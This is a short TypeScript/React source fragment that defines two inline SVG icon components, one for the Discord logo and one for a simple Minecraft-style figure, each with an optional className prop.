const DiscordIcon = ({ className = "" }: { className?: string }) => (
  <svg className={className} xmlns="http://www.w3.org/2000/svg" viewBox="0 0 127.14 96.36" fill="currentColor">
    <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1,105.25,105.25,0,0,0,32.19-16.14h0c2.74-27.46-3.8-50.55-19.12-72.16Zm-64.6,56.12c-6.19,0-11.32-5.74-11.32-12.78s4.94-12.79,11.32-12.79,11.45,5.81,11.32,12.79C54.42,58.45,49.46,64.19,43.1,64.19Zm40.82,0c-6.19,0-11.32-5.74-11.32-12.78s4.94-12.79,11.32-12.79,11.45,5.81,11.32,12.79C95.24,58.45,90.28,64.19,83.92,64.19Z"/>
  </svg>
);

const MinecraftIcon = ({ className = "" }: { className?: string }) => (
  <svg className={className} xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
    <path d="M3 6h6v6H3zm12 0h6v6h-6zm-6 6h6v3h3v9h-3v-6H9v6H6v-9h3z" />
  </svg>
);
